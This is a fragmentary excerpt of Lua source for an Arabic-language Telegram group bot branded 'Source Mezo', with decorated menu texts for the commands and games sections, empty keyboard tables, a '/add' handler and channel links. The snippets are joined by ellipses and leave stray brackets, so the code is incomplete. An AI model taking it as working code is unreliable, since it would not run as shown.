↑𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘𝙈𝘼𝙎𝙂 ➱ #msgs ☻  
↑𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘𝗖𝗛 ➯  ↝@mezo571↜ ☻  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
?? 𝟔 𖡻 #msgs  ࿇🦄
...
[🎯ألعاب سورس ميزو الاحسن في التليجرام .↑]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [《𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶》 ](t.me/mezo571)
]]
keyboard = {} 
...
local Text = [[
 ...
 تحت لي في الزر الأسفل𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘
 اختر الامر الذي تريدها .↑𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘
ده من الازرار بلاسفل . 𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[《𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶》 ](t.me/mezo571)❳ 
]]
keyboard = {} 
...
if Text == '/add' then
local Teext =[[
🎮 اهلا بك في قسم الالعاب ..↑⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧
🕹 اختر العبه الذي تريدفي الاسفل ..↑⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ❲[《𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶》 ](t.me/mezo571)❳ 
]]
keyboard = {} 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'ميزو')
